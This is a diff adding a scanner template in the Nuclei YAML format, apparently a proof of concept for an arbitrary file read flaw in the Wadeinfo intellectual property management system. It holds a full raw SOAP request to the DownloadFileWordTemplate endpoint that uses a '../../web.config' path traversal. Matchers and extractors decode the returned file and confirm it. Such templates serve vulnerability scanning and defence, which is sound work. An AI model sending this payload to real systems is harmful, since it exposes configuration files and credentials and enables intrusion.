@@ -1,0 +1,46 @@
+id: poc-yaml-wadeinfo-wsfm-downloadfileWordtemplate-fileread
+info:
+  name: 唯徳知识产权管理系统 DownloadFileWordTemplate 任意文件读取
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /AutoUpdate/WSFM.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <DownloadFileWordTemplate xmlns="http://tempuri.org/">
+        <fileName>../../web.config</fileName>
+        </DownloadFileWordTemplate>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<DownloadFileWordTemplateResponse"
+          - "</soap:Body>"
+      - type: regex
+        part: body
+        regex:
+          - "<DownloadFileWordTemplateResult>(.*?)</DownloadFileWordTemplateResult>"
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "<DownloadFileWordTemplateResult>(.*?)</DownloadFileWordTemplateResult>"
+      - type: dsl
+        dsl:
+          - "contains(base64_decode(template[\"DownloadFileWordTemplateResult\"]), '</configuration>')"
